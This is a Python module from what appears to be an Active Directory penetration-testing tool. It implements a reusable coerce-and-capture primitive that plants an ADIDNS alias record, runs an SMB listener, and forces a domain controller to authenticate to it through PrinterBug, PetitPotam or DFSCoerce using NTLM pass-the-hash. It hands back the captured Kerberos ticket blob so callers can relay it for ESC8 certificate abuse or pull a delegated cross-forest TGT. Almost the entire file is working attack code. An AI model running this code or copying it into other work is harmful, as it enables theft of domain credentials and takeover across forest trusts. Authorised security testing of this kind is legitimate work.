"""Reusable Kerberos coercion-capture primitive.

Composes the three services that ESC8-krb already wires together — ADIDNS alias
setup, the SMB Kerberos capture listener, and native coercion — into ONE
consumer-agnostic orchestration: *coerce a target to authenticate over Kerberos
to a name/SPN whose key we hold, and hand the raw SPNEGO blob back to the
caller*. The caller decides what to do with the blob:

* forward it opaquely (ESC8-krb relays it to ``certsrv``), or
* decode it (``services/krb_ap_req.py`` extracts a delegated TGT — the
  cross-forest cross-org-TGT-delegation consumer).

The two modes are the caller's; the front half (alias + listener + coerce +
capture) is shared and lives here. This module performs NO decode and NO
forward — single responsibility.

Design: docs/superpowers/specs/2026-08-03-kerberos-coercion-capture-module.md
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass

from adscan_core.rich_output import (
    print_error,
    print_info,
    print_info_debug,
    print_exception,
)
from adscan_core import telemetry
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.adidns import ADIDNSConfig, adidns_a_record_scope
from adscan_internal.services.coercion.runner import (
    NativeCoercionRunConfig,
    run_native_coercion,
)
from adscan_internal.services.relay.smb_krb_capture import (
    SMBKrbCaptureConfig,
    SMBKrbCaptureListener,
)

# An NTLM SPNEGO token starts with the "NTLMSSP\0" signature; a Kerberos AP-REQ
# does not. This is the same marker ``smb_krb_capture`` uses internally to tell
# the two apart on the wire (SMB2 SESSION_SETUP security buffer).
_NTLMSSP_SIGNATURE = b"NTLMSSP"


@dataclass
class KrbCaptureRequest:
    """Inputs for one coerce-and-capture run.

    Attributes:
        domain: The realm the ADIDNS record is written into (the compromised
            forest whose DNS we can write — the coerced target must resolve the
            alias through it).
        coerce_target_ip: The host to coerce (e.g. a DC of the trusting forest,
            or the CA host for ESC8).
        relay_alias_hostname: The SHORT hostname (no FQDN, no IP) the target is
            coerced to. It must resolve — via the ADIDNS record below — to our
            listener AND map to an SPN whose key we hold, so the inbound ticket
            is Kerberos and decryptable by the caller. (ESC8's DNS-prefix trick
            canonicalises this to an existing CA-machine SPN; the caller owns
            that choice.)
        listener_host: The IP our SMB listener binds on and the ADIDNS alias
            points at.
        adidns: Credentials/target for writing the alias A record.
        listener_port: Listener SMB port (445).
        capture_timeout: Seconds to wait for the coerced authentication.
        coercion: Optional explicit coercion config; when ``None`` a default is
            built (all methods, SMB listener auth) targeting the alias.
    """

    domain: str
    coerce_target_ip: str
    relay_alias_hostname: str
    listener_host: str
    adidns: ADIDNSConfig
    listener_port: int = 445
    capture_timeout: float = 120.0
    coercion: NativeCoercionRunConfig | None = None


@dataclass
class KrbCaptureResult:
    """Outcome of a coerce-and-capture run.

    ``spnego_blob`` is the raw SESSION_SETUP security buffer. ``is_kerberos`` is
    False when the captured authentication was NTLM — in which case NO forwarded
    TGT is present and a caller that needs one must surface an honest data gap,
    never a defence claim (Exposure-Validation doctrine).
    """

    spnego_blob: bytes | None
    is_kerberos: bool
    relay_alias: str
    error: str | None = None


def _default_coercion(req: KrbCaptureRequest) -> NativeCoercionRunConfig:
    """Build the default coercion config targeting the relay alias over SMB."""
    return NativeCoercionRunConfig(
        listener_host=req.relay_alias_hostname,
        listener_auth_type="smb",
        listener_port=req.listener_port,
        timeout_seconds=req.capture_timeout,
    )


def _coercion_secret_type(secret: str) -> str:
    """Classify a coercion secret as an NT hash (32 hex) or a cleartext password."""
    candidate = str(secret or "").strip()
    if len(candidate) == 32 and all(c in "0123456789abcdefABCDEF" for c in candidate):
        return "nt"
    return "password"


def _build_coercion_factory(req: KrbCaptureRequest):
    """Build the aiosmb ``SMBConnectionFactory`` that drives the RPC coercion call.

    The coercion RPC (PrinterBug/PetitPotam/DFSCoerce) authenticates to the target
    (``coerce_target_ip``) with the credential we hold in the compromised forest —
    the SAME credential that writes the ADIDNS alias (``req.adidns``).

    **This OUTBOUND trigger auth is NTLM/PtH, NOT Kerberos.** The Kerberos leg of
    this primitive is the INBOUND one — the coerced target authenticates BACK to
    the relay alias over Kerberos (driven by the SPN-canonicalization trick + TGT
    delegation on the trust), and THAT inbound AP-REQ is what carries the
    forwarded TGT the caller decrypts. How WE authenticate outbound to merely
    *trigger* the RPC is irrelevant to the inbound leg — it is a separate
    connection the target initiates on its own. Forcing Kerberos here is wrong on
    two counts:

    * The target is reached by IP (``coerce_target_ip`` — a DC of the trusting
      forest, resolved to its reachable NIC). An IP has no SPN, so
      ``from_components`` builds ``cifs/None@<realm>`` and the ticket mint fails
      (``No CCACHE present``) — the exact bug that made every coercion attempt
      abort before the RPC even fired, while ``nxc coerce_plus -H <hash>`` (NTLM
      PtH) triggered it fine.
    * The credential is cross-forest (a compromised-TRUSTED-forest admin reaching
      a TRUSTING-forest DC), so a Kerberos bind would need a cross-realm referral
      chain the trigger does not need at all — NTLM/PtH authenticates directly.

    So: NTLM with the hash/password we hold (``secrettype`` auto-classified), the
    IP as the connect target, no forced Kerberos, no ``cifs/None`` SPN.
    """
    from aiosmb.commons.connection.factory import SMBConnectionFactory

    adidns = req.adidns
    return SMBConnectionFactory.from_components(
        req.coerce_target_ip,
        adidns.username,
        adidns.password,
        secrettype=_coercion_secret_type(adidns.password),
        domain=adidns.domain,
        dcip=adidns.dc_ip or req.coerce_target_ip,
        authproto="ntlm",
    )


async def coerce_and_capture(req: KrbCaptureRequest) -> KrbCaptureResult:
    """Coerce ``coerce_target_ip`` to authenticate to the relay alias; return the blob.

    Sequence (the ADIDNS record and the listener are both cleaned up even on
    error):

    1. Write the ADIDNS A record ``relay_alias_hostname -> listener_host``
       (RAII scope — auto-removed on exit).
    2. Start the SMB Kerberos capture listener on ``listener_host:listener_port``.
    3. Trigger native coercion of ``coerce_target_ip`` toward the alias.
    4. Await the captured SPNEGO blob (up to ``capture_timeout``).
    5. Classify Kerberos vs NTLM and return.

    Never raises — a failure at any stage is returned as
    ``KrbCaptureResult(spnego_blob=None, is_kerberos=False, error=...)``.
    """
    alias_fqdn = f"{req.relay_alias_hostname}.{req.adidns.effective_zone}"
    print_info(
        "Kerberos coercion-capture — alias "
        f"{mark_sensitive(alias_fqdn, 'hostname')} → "
        f"{mark_sensitive(req.listener_host, 'ip')}; coercing "
        f"{mark_sensitive(req.coerce_target_ip, 'ip')}"
    )
    try:
        async with adidns_a_record_scope(
            req.adidns, req.relay_alias_hostname, req.listener_host
        ):
            queue: asyncio.Queue[bytes] = asyncio.Queue()
            listener = SMBKrbCaptureListener(
                SMBKrbCaptureConfig(
                    listen_host=req.listener_host,
                    listen_port=req.listener_port,
                    timeout_seconds=req.capture_timeout,
                ),
                queue,
            )
            await listener.start()
            try:
                # Fire the coercion. The RPC returns quickly; the coerced
                # authentication arrives asynchronously at the listener and is
                # buffered in the queue, so awaiting the queue afterwards is
                # race-free.
                coercion = req.coercion or _default_coercion(req)
                await run_native_coercion(
                    connection_factory=_build_coercion_factory(req),
                    target_host=req.coerce_target_ip,
                    config=coercion,
                    target_name=req.relay_alias_hostname,
                )
                spnego_blob = await asyncio.wait_for(
                    queue.get(), timeout=req.capture_timeout
                )
            finally:
                await listener.stop()
    except asyncio.TimeoutError:
        print_info_debug(
            "[krb-capture] no authentication captured within "
            f"{req.capture_timeout:.0f}s — the coercion did not reach the listener."
        )
        return KrbCaptureResult(
            spnego_blob=None,
            is_kerberos=False,
            relay_alias=alias_fqdn,
            # Honest data gap (Exposure-Validation): never a defense claim. Name the
            # two most likely causes so the operator can diagnose — cross-forest name
            # resolution of the relay alias, or TGT delegation not enabled on the trust.
            error=(
                "no authentication captured (coercion did not reach the listener) — "
                f"the coerced DC may be unable to resolve the relay alias {alias_fqdn} "
                "(no cross-forest conditional forwarder to the trusted zone), or TGT "
                "delegation is not enabled on the trust"
            ),
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_error("Kerberos coercion-capture failed.")
        return KrbCaptureResult(
            spnego_blob=None,
            is_kerberos=False,
            relay_alias=alias_fqdn,
            error=f"{type(exc).__name__}: {exc}",
        )

    is_kerberos = not spnego_blob.startswith(_NTLMSSP_SIGNATURE)
    if not is_kerberos:
        print_info_debug(
            "[krb-capture] captured NTLM (not Kerberos) — no forwarded TGT is "
            "present; a delegated-TGT consumer must treat this as a data gap."
        )
    else:
        print_info_debug(
            f"[krb-capture] captured Kerberos SPNEGO ({len(spnego_blob)} bytes)."
        )
    return KrbCaptureResult(
        spnego_blob=spnego_blob, is_kerberos=is_kerberos, relay_alias=alias_fqdn
    )


__all__ = ["KrbCaptureRequest", "KrbCaptureResult", "coerce_and_capture"]
